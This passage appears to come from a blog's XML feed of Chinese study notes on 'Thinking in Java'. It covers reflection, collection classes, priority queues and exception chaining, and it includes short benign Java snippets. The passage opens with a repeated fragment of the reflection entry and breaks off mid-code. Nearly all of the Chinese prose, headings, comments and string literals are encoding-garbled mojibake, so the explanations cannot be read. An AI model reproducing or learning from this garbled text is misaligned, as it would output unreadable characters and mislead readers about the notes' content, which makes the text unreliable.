é€šè¿‡å“ªä¸ªç±»çš„å¯¹è±¡è·å–å˜é‡</span></span><br><span class="line">field.set(ç±»çš„å¯¹è±¡,éœ€è¦ä¿®æ”¹çš„å€¼); <span class="comment">//ä¿®æ”¹å˜é‡</span></span><br></pre></td></tr></table></figure><p><strong>å¦‚æœè¦è·å–épublicåˆ™éƒ½é‡‡ç”¨getDeclaredXXX</strong></p>]]></content>
      
      
      <categories>
          
          <category> javaç¼–ç¨‹æ€æƒ³ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç¬¬14ç«  åå°„</title>
      <link href="/2021/06/16/%E7%AC%AC14%E7%AB%A0_%E5%8F%8D%E5%B0%84/"/>
      <url>/2021/06/16/%E7%AC%AC14%E7%AB%A0_%E5%8F%8D%E5%B0%84/</url>
      
        <content type="html"><![CDATA[<h2 id="ä»€ä¹ˆæ˜¯åå°„ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯åå°„ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯åå°„ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯åå°„ï¼Ÿ</h2><p><strong>åå°„æ˜¯åœ¨è¿è¡Œæ—¶åŠ¨æ€è®¿é—®ç±»å’Œå¯¹è±¡çš„æŠ€æœ¯</strong></p><h2 id="ä¸ºä»€ä¹ˆè¦ç”¨åå°„ï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆè¦ç”¨åå°„ï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆè¦ç”¨åå°„ï¼Ÿ"></a>ä¸ºä»€ä¹ˆè¦ç”¨åå°„ï¼Ÿ</h2><blockquote><ul><li><strong>å®ä¾‹åŒ–å¯¹è±¡ç”¨newå…³é”®å­—ï¼Œä½†æ˜¯è¿™æ ·å°±æŠŠå®ä¾‹åŒ–çš„å·¥ä½œå›ºå®šåœ¨ç¨‹åºä¸­ï¼Œä¸çµæ´»ä¼šå‡ºç°å„ç§é—®é¢˜ã€‚</strong></li><li><strong>åå°„å¯ä»¥å°†åˆ›å»ºå¯¹è±¡çš„æ—¶æœºä»ç¼–è¯‘æ—¶å»¶è¿Ÿåˆ°ç¨‹åºè¿è¡Œæ—¶</strong></li><li><strong>å½“æ·»åŠ æ–°çš„åŠŸèƒ½æ—¶ï¼Œå¦‚æœä¸ç”¨åå°„å°†éœ€è¦ä¿®æ”¹ä»£ç ï¼Œä¿®æ”¹å®Œéœ€è¦é‡æ–°ä¸Šçº¿éå¸¸éº»çƒ¦ï¼Œè€Œç”¨åå°„åˆ™æ²¡æœ‰è¿™ä¸ªé—®é¢˜</strong></li></ul></blockquote><h2 id="14-2-Classå¯¹è±¡"><a href="#14-2-Classå¯¹è±¡" class="headerlink" title="14.2 Classå¯¹è±¡"></a>14.2 Classå¯¹è±¡</h2><blockquote><p><strong>åœ¨ç¨‹åºè¿è¡Œæ—¶ï¼ŒClasså¯¹è±¡ä¿å­˜äº†ç±»å’Œå¯¹è±¡çš„å…·ä½“ä¿¡æ¯ã€‚</strong><br><strong>æ¯ä¸ªç±»éƒ½æœ‰ä¸€ä¸ªClasså¯¹è±¡ï¼Œæ¯å½“ç¼–è¯‘ä¸€ä¸ªç±»ï¼Œå³.javaç¼–è¯‘æˆ.classæ–‡ä»¶ï¼Œå°±ä¼šäº§ç”Ÿä¸€ä¸ªClasså¯¹è±¡ä¿å­˜åœ¨.classæ–‡ä»¶ä¸­</strong></p></blockquote><h2 id="ç±»åŠ è½½å™¨ï¼š"><a href="#ç±»åŠ è½½å™¨ï¼š" class="headerlink" title="ç±»åŠ è½½å™¨ï¼š"></a>ç±»åŠ è½½å™¨ï¼š</h2><blockquote><p><strong>javaç¨‹åºåœ¨è¿è¡Œä¹‹å‰å¹¶éå®Œå…¨åŠ è½½ï¼š</strong></p><ul><li><strong>ç¬¬ä¸€æ¬¡ä½¿ç”¨è¿™ä¸ªç±»ï¼Œå°±åŠ¨æ€åŠ è½½åˆ°JVMä¸­ã€‚å½“åˆ›å»ºç¬¬ä¸€ä¸ªå¯¹ç±»çš„é™æ€æˆå‘˜çš„å¼•ç”¨æˆ–è€…æ„é€ å™¨æ—¶å°±ä¼šåŠ è½½è¿™ä¸ªç±»</strong></li></ul></blockquote><blockquote><p><strong>ç±»åŠ è½½å™¨å·¥ä½œæ­¥éª¤ï¼š</strong></p><ol><li><strong>é¦–å…ˆæ£€æŸ¥ä¸€ä¸ªç±»çš„Classå¯¹è±¡ï¼ˆæˆ–ç†è§£.classæ–‡ä»¶ï¼‰æ˜¯å¦å·²è¢«åŠ è½½</strong></li><li><strong>å¦‚æœå°šæœªåŠ è½½ï¼Œé»˜è®¤çš„ç±»åŠ è½½å™¨å°±ä¼šæ ¹æ®ç±»åæŸ¥æ‰¾.classæ–‡ä»¶</strong></li><li><strong>ä¸€æ—¦Classå¯¹è±¡ï¼ˆ.classæ–‡ä»¶ï¼‰è¢«åŠ è½½äº†ï¼ˆè½½å…¥jvmï¼‰ï¼Œå®ƒå°±è¢«ç”¨æ¥åˆ›å»ºè¿™ä¸ªç±»çš„æ‰€æœ‰å¯¹è±¡</strong></li></ol></blockquote><h3 id="è·å–Classå¯¹è±¡çš„å¼•ç”¨"><a href="#è·å–Classå¯¹è±¡çš„å¼•ç”¨" class="headerlink" title="è·å–Classå¯¹è±¡çš„å¼•ç”¨"></a>è·å–Classå¯¹è±¡çš„å¼•ç”¨</h3><blockquote><p><code>**Classå¯¹è±¡ = Class.forName(&quot;...&quot; )**</code><strong>å¯ä»¥è¿”å›æŒ‡å®šClasså¯¹è±¡çš„å¼•ç”¨ï¼Œå¹¶ä¸”è‹¥æŒ‡å®šçš„ç±»æ²¡æœ‰è¢«åŠ è½½ï¼Œå°±åŠ è½½å®ƒ</strong><br><strong>å¦‚æœæ²¡æœ‰Classå¯¹è±¡ï¼Œå¯ä»¥ç”¨forNameè·å–ã€‚å¦‚æœå·²ç»æœ‰ä¸€ä¸ªClasså¯¹è±¡ï¼Œåˆ™å¯ä»¥ç”¨<code>getClassï¼ˆ)</code> æ–¹æ³•è·å–Classå¼•ç”¨</strong></p></blockquote><hr><h2 id="Classå¸¸ç”¨æ–¹æ³•"><a href="#Classå¸¸ç”¨æ–¹æ³•" class="headerlink" title="Classå¸¸ç”¨æ–¹æ³•"></a>Classå¸¸ç”¨æ–¹æ³•</h2><blockquote><ul><li><strong>Class.forName(â€œClass pathâ€)  Â  Â Â  Â Â   è·å–æŒ‡å®šClasså¯¹è±¡</strong></li><li>**Classå¯¹è±¡.newInstance()                  ä½¿ç”¨é»˜è®¤æ„é€ å™¨æ„é€ å¯¹è±¡ **</li><li><strong>Classå¯¹è±¡.getConstructor()              è·å–æŒ‡å®šçš„ publicä¿®é¥°æ„é€ æ–¹æ³• Constructorå¯¹è±¡</strong></li><li><strong>Classå¯¹è±¡.getMethod()                    è·å–æŒ‡å®šçš„ publicä¿®é¥°æ–¹æ³• Methodå¯¹è±¡</strong></li><li><strong>Classå¯¹è±¡.getField()Â  Â Â                     è·å–æŒ‡å®šçš„ publicä¿®é¥°æˆå‘˜å˜é‡ Fieldå¯¹è±¡</strong></li></ul></blockquote><h2 id="ä½¿ç”¨å¸¦å‚æ„é€ æ–¹æ³•åˆ›å»ºå¯¹è±¡ï¼ˆåå°„ï¼‰"><a href="#ä½¿ç”¨å¸¦å‚æ„é€ æ–¹æ³•åˆ›å»ºå¯¹è±¡ï¼ˆåå°„ï¼‰" class="headerlink" title="ä½¿ç”¨å¸¦å‚æ„é€ æ–¹æ³•åˆ›å»ºå¯¹è±¡ï¼ˆåå°„ï¼‰"></a>ä½¿ç”¨å¸¦å‚æ„é€ æ–¹æ³•åˆ›å»ºå¯¹è±¡ï¼ˆåå°„ï¼‰</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Class <span class="class"><span class="keyword">class</span>å¯¹è±¡ </span>= Class.forName(<span class="string">&quot; Classè·¯å¾„ &quot;</span>);</span><br><span class="line">Constructor constructor = <span class="class"><span class="keyword">class</span>å¯¹è±¡.<span class="title">getConstructor</span>(<span class="title">new</span> <span class="title">Class</span>[]</span>&#123; <span class="comment">//é€šè¿‡æ„é€ å™¨çš„å‚æ•°è·å–æ„é€ å™¨å¯¹è±¡</span></span><br><span class="line"><span class="comment">//å¸¦å‚æ„é€ å™¨çš„å‚æ•°</span></span><br><span class="line">    String.class , Float.class,...</span><br><span class="line">&#125;);</span><br><span class="line">E ç±»çš„å¯¹è±¡ = (E) constructor.newInstance(<span class="keyword">new</span> Object[]&#123; <span class="comment">//é€šè¿‡æ„é€ å™¨å¯¹è±¡</span></span><br><span class="line">    <span class="comment">//ä¼ é€’å‚æ•°ç»™å¸¦å‚æ„é€ å™¨</span></span><br><span class="line">    <span class="string">&quot;...&quot;</span>,...,<span class="string">&quot;...&quot;</span>,...</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="ä½¿ç”¨åå°„è°ƒç”¨æ–¹æ³•"><a href="#ä½¿ç”¨åå°„è°ƒç”¨æ–¹æ³•" class="headerlink" title="ä½¿ç”¨åå°„è°ƒç”¨æ–¹æ³•"></a>ä½¿ç”¨åå°„è°ƒç”¨æ–¹æ³•</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Class <span class="class"><span class="keyword">class</span>å¯¹è±¡ </span>= Class.forName(<span class="string">&quot; Classè·¯å¾„ &quot;</span>);</span><br><span class="line">Method method = <span class="class"><span class="keyword">class</span>å¯¹è±¡.<span class="title">getMethod</span>(&quot;æ–¹æ³•å&quot;,<span class="title">new</span> <span class="title">Class</span>[]</span>&#123;</span><br><span class="line"><span class="comment">//æ„é€ å™¨çš„å‚æ•°</span></span><br><span class="line">    String.class , Float.class,...</span><br><span class="line">&#125;); <span class="comment">//é€šè¿‡æ–¹æ³•åå’Œæ–¹æ³•çš„å‚æ•°è·å–æ–¹æ³•å¹¶è¿”å›æ–¹æ³•å¯¹è±¡</span></span><br><span class="line">method.invoke(ç±»çš„å¯¹è±¡,å‚æ•°...);<span class="comment">//é€šè¿‡å“ªä¸ªç±»çš„å¯¹è±¡è°ƒç”¨è¿™ä¸ªæ–¹æ³•ä»¥åŠæ–¹æ³•å‚æ•°æ¥æ‰§è¡Œæ–¹æ³•</span></span><br></pre></td></tr></table></figure><h2 id="ä½¿ç”¨åå°„è·å–æˆå‘˜å¯¹è±¡"><a href="#ä½¿ç”¨åå°„è·å–æˆå‘˜å¯¹è±¡" class="headerlink" title="ä½¿ç”¨åå°„è·å–æˆå‘˜å¯¹è±¡"></a>ä½¿ç”¨åå°„è·å–æˆå‘˜å¯¹è±¡</h2><p><strong>è·å–åˆ°æˆå‘˜å¯¹è±¡åå¯ä»¥é€šè¿‡getæˆ–è€…setè·å–æ•°æ®æˆ–ä¿®æ”¹æ•°æ®</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class <span class="class"><span class="keyword">class</span>å¯¹è±¡ </span>= Class.forName(<span class="string">&quot; Classè·¯å¾„ &quot;</span>);</span><br><span class="line">Field field = <span class="class"><span class="keyword">class</span>å¯¹è±¡.<span class="title">getField</span>(&quot;æˆå‘˜å¯¹è±¡å&quot;)</span>; <span class="comment">// é€šè¿‡å˜é‡åè·å–æˆå‘˜å¯¹è±¡</span></span><br><span class="line">print(field.get(ç±»çš„å¯¹è±¡)); <span class="comment">// é€šè¿‡å“ªä¸ªç±»çš„å¯¹è±¡è·å–å˜é‡</span></span><br><span class="line">field.set(ç±»çš„å¯¹è±¡,éœ€è¦ä¿®æ”¹çš„å€¼); <span class="comment">//ä¿®æ”¹å˜é‡</span></span><br></pre></td></tr></table></figure><p><strong>å¦‚æœè¦è·å–épublicåˆ™éƒ½é‡‡ç”¨getDeclaredXXX</strong></p>]]></content>
      
      
      <categories>
          
          <category> javaç¼–ç¨‹æ€æƒ³ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç¬¬11ç«  æŒæœ‰å¯¹è±¡</title>
      <link href="/2021/06/15/%E7%AC%AC11%E7%AB%A0_%E6%8C%81%E6%9C%89%E5%AF%B9%E8%B1%A1/"/>
      <url>/2021/06/15/%E7%AC%AC11%E7%AB%A0_%E6%8C%81%E6%9C%89%E5%AF%B9%E8%B1%A1/</url>
      
        <content type="html"><![CDATA[<h2 id="11-2-åŸºæœ¬æ¦‚å¿µ"><a href="#11-2-åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="11.2 åŸºæœ¬æ¦‚å¿µ"></a>11.2 åŸºæœ¬æ¦‚å¿µ</h2><p><img src="https://img14.360buyimg.com/ddimg/jfs/t1/194804/21/8107/119987/60c80d9eE646309f6/14b69fd5d3d42e6d.jpg"></p><blockquote><p><strong>Collectionæ¥å£ï¼š</strong></p><ul><li><strong>Listæ¥å£ï¼š</strong><ul><li><strong>LinkedListï¼šé“¾è¡¨ï¼Œæ²¡æœ‰åŒæ­¥ï¼Œçº¿ç¨‹ä¸å®‰å…¨</strong></li><li><strong>ArrayListï¼šæ•°ç»„ï¼Œæ²¡æœ‰åŒæ­¥ï¼Œçº¿ç¨‹ä¸å®‰å…¨</strong></li><li><strong>Vectorï¼šæ•°ç»„ï¼ŒåŒæ­¥ï¼Œçº¿ç¨‹å®‰å…¨</strong><ul><li><strong>Stackï¼šç»§æ‰¿Vectorï¼Œçº¿ç¨‹å®‰å…¨</strong></li></ul></li></ul></li><li><strong>Setæ¥å£ï¼šä¸å¯é‡å¤ï¼Œå†…éƒ¨æ’åº</strong><ul><li><strong>HashSetï¼šæ•£åˆ—å‡½æ•°</strong><ul><li><strong>LinkedHashSetï¼šé“¾è¡¨ç»´æŠ¤å…ƒç´ çš„æ’å…¥æ¬¡åº</strong></li></ul></li><li><strong>TreeSetï¼šåº•å±‚ä¸ºçº¢é»‘æ ‘ï¼Œè‡ªåŠ¨å‡åºæ’åºä¿å­˜</strong></li></ul></li></ul></blockquote><blockquote><p><strong>Mapæ¥å£ï¼š</strong></p><ul><li><strong>HashMapï¼šæŸ¥æ‰¾æœ€å¿«ï¼Œæ— é¡ºåº ï¼Œæ²¡æœ‰åŒæ­¥ï¼Œ çº¿ç¨‹ä¸å®‰å…¨</strong><ul><li><strong>LinkedHashMapï¼šä¿ç•™HashMapçš„é€Ÿåº¦ï¼ŒæŒ‰ç…§æ’å…¥é¡ºåºä¿å­˜</strong></li></ul></li><li><strong>TreeMapï¼šçº¢é»‘æ ‘ï¼Œè‡ªåŠ¨å‡åºæ’åºä¿å­˜</strong></li><li><strong>Hashtableï¼šæ¥å£å®ç°ç±»ï¼Œ åŒæ­¥ï¼Œ çº¿ç¨‹å®‰å…¨</strong></li></ul></blockquote><h2 id="11-3-Collectionæ¥å£æ–¹æ³•"><a href="#11-3-Collectionæ¥å£æ–¹æ³•" class="headerlink" title="11.3 Collectionæ¥å£æ–¹æ³•"></a>11.3 Collectionæ¥å£æ–¹æ³•</h2><p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/179128/17/9179/165707/60c74ba0E32f5b85a/9a68e43c3f21496a.jpg"></p><hr><h2 id="11-5-Listæ¥å£"><a href="#11-5-Listæ¥å£" class="headerlink" title="11.5 Listæ¥å£"></a>11.5 Listæ¥å£</h2><p><img src="https://img14.360buyimg.com/ddimg/jfs/t1/177265/15/8483/192890/60c80984Ec5274ff2/a5c5d7852650e1ad.jpg"></p><hr><h2 id="11-6-è¿­ä»£å™¨Iterator"><a href="#11-6-è¿­ä»£å™¨Iterator" class="headerlink" title="11.6 è¿­ä»£å™¨Iterator"></a>11.6 è¿­ä»£å™¨Iterator</h2><blockquote><p><strong>Iteratorï¼š</strong></p><ul><li><strong>iteratorï¼ˆï¼‰ è¿”å›ä¸€ä¸ªiteratorï¼Œå°†å‡†å¤‡å¥½è¿”å›åºåˆ—ç¬¬ä¸€ä¸ªå…ƒç´ </strong></li><li><strong>nextï¼ˆï¼‰ è·å¾—åºåˆ—ä¸‹ä¸€ä¸ªå…ƒç´ </strong></li><li><strong>hasNextï¼ˆï¼‰ åˆ¤æ–­åºåˆ—æ˜¯å¦è¿˜æœ‰å…ƒç´ </strong></li><li><strong>removeï¼ˆï¼‰å°†è¿­ä»£å™¨è¿”å›çš„å…ƒç´ åˆ é™¤</strong></li></ul></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Iterator&lt;...&gt; it = a.iterator();</span><br><span class="line"><span class="keyword">while</span>(it.hasNext())&#123;</span><br><span class="line">print(it.next());</span><br><span class="line">    it.remove();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>å¦‚æœåªæƒ³éå†Listï¼Œä¸æƒ³ä¿®æ”¹ï¼Œåº”è¯¥ç”¨foreach</strong></p><h3 id="11-6-1-ListIterator"><a href="#11-6-1-ListIterator" class="headerlink" title="11.6.1 ListIterator"></a>11.6.1 ListIterator</h3><p><img src="https://img10.360buyimg.com/ddimg/jfs/t1/174547/24/14667/332001/60c81452E423a1227/7973fcdf1a3097f0.jpg"></p><hr><h2 id="11-9-Set"><a href="#11-9-Set" class="headerlink" title="11.9 Set"></a>11.9 Set</h2><blockquote><p><strong>Setå’ŒListçš„åŒºåˆ«ï¼š</strong></p><ul><li><strong>Listå…ƒç´ å¯ä»¥é‡å¤ï¼ŒSetä¸èƒ½é‡å¤</strong></li><li><strong>Listå¯ä»¥æ ¹æ®ç´¢å¼•æ“ä½œå…ƒç´ ï¼ŒSetä¸èƒ½</strong></li><li><strong>ListæŒ‰ç…§æ’å…¥é¡ºåºä¿å­˜ï¼ŒSetä¸ä¸€å®š</strong></li></ul></blockquote><hr><h2 id="11-10-Map"><a href="#11-10-Map" class="headerlink" title="11.10 Map"></a>11.10 Map</h2><p><img src="https://img14.360buyimg.com/ddimg/jfs/t1/195266/31/8254/290736/60c84667E2b4c4f75/101c49f5fe6ff436.jpg"></p><hr><h2 id="11-11-Queue"><a href="#11-11-Queue" class="headerlink" title="11.11 Queue"></a>11.11 Queue</h2><p><strong>Collection-ã€‹Queue-ã€‹LinkedList</strong><br><strong>åˆ›å»ºä¸€ä¸ªé˜Ÿåˆ—ï¼š<code>Queue&lt;...&gt; queue = new LinkedList&lt;...&gt;()</code></strong></p><h3 id="Queueæ–¹æ³•"><a href="#Queueæ–¹æ³•" class="headerlink" title="Queueæ–¹æ³•"></a>Queueæ–¹æ³•</h3><blockquote><ul><li><strong>ç»§æ‰¿è‡ªCollectionï¼Œç‰¹æ®Šæ–¹æ³•å¦‚ä¸‹ï¼š</strong><ul><li><strong>boolean offerï¼ˆï¼‰ å°†å…ƒç´ æ’å…¥é˜Ÿå°¾ï¼Œæˆ–è¿”å›false</strong></li><li><strong>E peekï¼ˆï¼‰ è¿”å›é˜Ÿå¤´ï¼Œè‹¥é˜Ÿåˆ—ä¸ºç©ºåˆ™è¿”å›null</strong></li><li><strong>E pollï¼ˆï¼‰ åˆ é™¤é˜Ÿå¤´å¹¶è¿”å›ï¼Œè‹¥é˜Ÿåˆ—ä¸ºç©ºè¿”å›null</strong></li></ul></li></ul></blockquote><h3 id="11-11-1-PriorityQueue"><a href="#11-11-1-PriorityQueue" class="headerlink" title="11.11.1 PriorityQueue"></a>11.11.1 PriorityQueue</h3><ul><li><strong>è‡ªå®šä¹‰ä¼˜å…ˆçº§æ¯”è¾ƒå™¨ï¼Œä½œä¸ºä¼˜å…ˆé˜Ÿåˆ—æ„é€ å™¨çš„å‚æ•°ã€‚</strong></li><li><strong>ä¼˜å…ˆé˜Ÿåˆ—ç»§æ‰¿è‡ªQueueï¼Œæœ‰åŒæ ·çš„æ–¹æ³•ã€‚</strong><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//è‡ªå®šä¹‰æ¯”è¾ƒå™¨ï¼Œé™åºæ’åˆ—</span></span><br><span class="line"><span class="keyword">static</span> Comparator&lt;Integer&gt; cmp = <span class="keyword">new</span> Comparator&lt;Integer&gt;() &#123;</span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(Integer e1, Integer e2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> e2 - e1;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//ä¸ç”¨æ¯”è¾ƒå™¨ï¼Œé»˜è®¤å‡åºæ’åˆ—</span></span><br><span class="line">        Queue&lt;Integer&gt; q = <span class="keyword">new</span> PriorityQueue&lt;&gt;();</span><br><span class="line">        q.add(<span class="number">3</span>);</span><br><span class="line">        q.add(<span class="number">2</span>);</span><br><span class="line">        q.add(<span class="number">4</span>);</span><br><span class="line">        <span class="keyword">while</span>(!q.isEmpty())</span><br><span class="line">        &#123;</span><br><span class="line">            System.out.print(q.poll()+<span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * è¾“å‡ºç»“æœ</span></span><br><span class="line"><span class="comment">         * 2 3 4</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="comment">//ä½¿ç”¨è‡ªå®šä¹‰æ¯”è¾ƒå™¨ï¼Œé™åºæ’åˆ—</span></span><br><span class="line">        Queue&lt;Integer&gt; qq = <span class="keyword">new</span> PriorityQueue&lt;&gt;(cmp);</span><br><span class="line">        qq.add(<span class="number">3</span>);</span><br><span class="line">        qq.add(<span class="number">2</span>);</span><br><span class="line">        qq.add(<span class="number">4</span>);</span><br><span class="line">        <span class="keyword">while</span>(!qq.isEmpty())</span><br><span class="line">        &#123;</span><br><span class="line">            System.out.print(qq.poll()+<span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> javaç¼–ç¨‹æ€æƒ³ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç¬¬12ç«  å¼‚å¸¸</title>
      <link href="/2021/06/15/%E7%AC%AC12%E7%AB%A0_%E5%BC%82%E5%B8%B8/"/>
      <url>/2021/06/15/%E7%AC%AC12%E7%AB%A0_%E5%BC%82%E5%B8%B8/</url>
      
        <content type="html"><![CDATA[<h2 id="å¼‚å¸¸ç±»å‹ï¼š"><a href="#å¼‚å¸¸ç±»å‹ï¼š" class="headerlink" title="å¼‚å¸¸ç±»å‹ï¼š"></a>å¼‚å¸¸ç±»å‹ï¼š</h2><p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/193416/23/8345/103204/60c85e4cEf4c28547/920bb04309c42c67.jpg"></p><hr><h2 id="12-4-åˆ›å»ºè‡ªå®šä¹‰å¼‚å¸¸"><a href="#12-4-åˆ›å»ºè‡ªå®šä¹‰å¼‚å¸¸" class="headerlink" title="12.4 åˆ›å»ºè‡ªå®šä¹‰å¼‚å¸¸"></a>12.4 åˆ›å»ºè‡ªå®šä¹‰å¼‚å¸¸</h2><blockquote><p><strong>åˆ›å»ºè‡ªå®šä¹‰å¼‚å¸¸ç±»å¹¶ç»§æ‰¿Throwableç±»æˆ–å…¶å­ç±»</strong></p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">newException</span> <span class="keyword">extends</span> <span class="title">Exception</span></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">newException</span><span class="params">()</span></span>&#123;&#125; <span class="comment">//æ— å‚æ„é€ å™¨ ä¼šè‡ªåŠ¨äº§ç”Ÿæœ€æ–¹ä¾¿</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">newException</span><span class="params">(String msg)</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(msg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="12-6-printStackTrace-ï¼š"><a href="#12-6-printStackTrace-ï¼š" class="headerlink" title="12.6 printStackTrace()ï¼š"></a>12.6 printStackTrace()ï¼š</h2><blockquote><p><strong>å°†æ‰“å°â€œä»æ–¹æ³•è°ƒç”¨å¤„ç›´åˆ°å¼‚å¸¸æŠ›å‡ºå¤„â€çš„æ–¹æ³•è°ƒç”¨åºåˆ—</strong><br><strong>printStackTraceï¼ˆï¼‰ä¿¡æ¯å¯ç”±getStackTraceï¼ˆï¼‰ç›´æ¥è®¿é—®</strong></p><ul><li><strong>è¿”å›ä¸€ä¸ªæ ˆæ•°ç»„ï¼Œæ ˆé¡¶æ˜¯æœ€åä¸€ä¸ªè°ƒç”¨çš„æ–¹æ³•ï¼Œæ ˆåº•æ˜¯ç¬¬ä¸€ä¸ªè°ƒç”¨çš„æ–¹æ³•</strong></li></ul></blockquote><h3 id="12-6-3-å¼‚å¸¸é“¾"><a href="#12-6-3-å¼‚å¸¸é“¾" class="headerlink" title="12.6.3 å¼‚å¸¸é“¾"></a>12.6.3 å¼‚å¸¸é“¾</h3><blockquote><p><strong>åœ¨æ•è·ä¸€ä¸ªå¼‚å¸¸åæŠ›å‡ºå¦ä¸€ä¸ªå¼‚å¸¸ï¼ŒæŠŠåŸå§‹å¼‚å¸¸ä¿¡æ¯ä¿å­˜èµ·æ¥ï¼Œä¸ºå¼‚å¸¸é“¾</strong><br><strong>å¼‚å¸¸é“¾å†™æ³•ï¼š</strong></p><ol><li><strong>å°†catchåˆ°çš„å¼‚å¸¸å¯¹è±¡ä½œä¸ºcauseå‚æ•°æ”¾å…¥æ„é€ å™¨ä¼ é€’ç»™ä¸‹ä¸€ä¸ªå¼‚å¸¸</strong></li><li><strong>åˆ›å»ºå¼‚å¸¸å¯¹è±¡å®ä¾‹åŒ–åç”¨initCauseï¼ˆåŸå§‹å¼‚å¸¸å¯¹è±¡ï¼‰</strong></li></ol></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">testOne</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IOException(<span class="string">&quot;ç¬¬ä¸€ä¸ªå¼‚å¸¸&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">testTwo</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">testOne();</span><br><span class="line">&#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> IOException(<span class="string">&quot;ç¬¬äºŒä¸ªå¼‚å¸¸&quot;</span>,e);</span><br><span class="line">        <span class="comment">/*    å†™æ³•äºŒï¼š</span></span><br><span class="line"><span class="comment">        Exception e1 = new IOException(&quot;ç¬¬äºŒä¸ªå¼‚å¸¸&quot;);</span></span><br><span class="line"><span class="comment">        e1.initCause(e);</span></span><br><span class="line"><span class="comment">        throw e1;</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"><span 